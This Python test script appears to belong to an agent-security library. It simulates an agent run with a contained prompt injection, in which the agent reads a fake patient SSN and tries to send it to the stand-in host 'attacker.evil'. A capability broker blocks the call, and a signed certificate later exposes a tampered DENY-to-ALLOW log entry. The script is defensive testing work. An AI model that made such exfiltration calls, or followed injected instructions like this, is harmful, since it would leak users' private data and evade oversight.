"""Foundation compose-test (no torch): events + capability + certificate.
Records an agent-shaped run with a contained prompt-injection, issues a signed
ExecutionCertificate, verifies it offline, then tampers a record and confirms
the certificate catches it.
"""
import os, sys, hashlib
HERE = os.path.dirname(__file__)
sys.path.insert(0, os.path.join(HERE, "..", "src"))
sys.path.insert(0, os.path.join(HERE, "..", "vendored"))

from vitnium.events import EventLog, Kind
from vitnium.capability import Broker
from vitnium.certificate import issue_certificate, verify_certificate

EXFIL, SECRET = [], "patient_ssn=123-45-6789"
tools = {
    "read_public":   lambda x: f"public::{x}",
    "read_secret":   lambda: SECRET,
    "send_external": lambda dest, data: (EXFIL.append((dest, data)), "SENT")[1],
}
KEY = b"demo-signing-key"
PROG = hashlib.blake2b(b"react-agent-v0", digest_size=16).hexdigest()

def run_agent(caps):
    log = EventLog()
    br = Broker(caps, tools, log)
    log.append(Kind.LLM_CALL, {"prompt_hash": "ab12", "resp_tok": [791, 2951], "seed": 42})
    br.call("read_public", "ticket#7")
    log.append(Kind.ENTROPY, {"source": "rand", "value": 0.5488135})
    br.call("read_secret")
    br.call("send_external", "attacker.evil", SECRET)
    log.append(Kind.LLM_CALL, {"prompt_hash": "cd34", "resp_tok": [13, 1820], "seed": 42})
    return log

print("="*70)
print("FOUNDATION COMPOSE-TEST  (events + capability + certificate, reused)")
print("="*70)
EXFIL.clear()
log = run_agent(caps={"read_public"})
cert, cas = issue_certificate(PROG, {"read_public"}, log, key=KEY)
print(f"\nrun recorded: {len(log)} events   exfiltrated = {EXFIL}   (empty = contained)")
print(f"certificate: caps={cert.capabilities} root={cert.event_root[:20]}... sig={cert.sig[:20]}...")
v = verify_certificate(cert, log, key=KEY)
print(f"offline verify (untampered): ok={v['ok']}")
for e in log.events:
    if e.payload.get("tool") == "send_external":
        e.payload["decision"] = "ALLOW"; e.payload["result"] = "SENT"
v2 = verify_certificate(cert, log, key=KEY)
print(f"offline verify (DENY->ALLOW tamper): ok={v2['ok']}")
ok = v["ok"] and not v2["ok"] and EXFIL == []
print("\nRESULT:", "FOUNDATION COMPOSES OK (contained, certified, tamper-evident)" if ok else "PROBLEM")
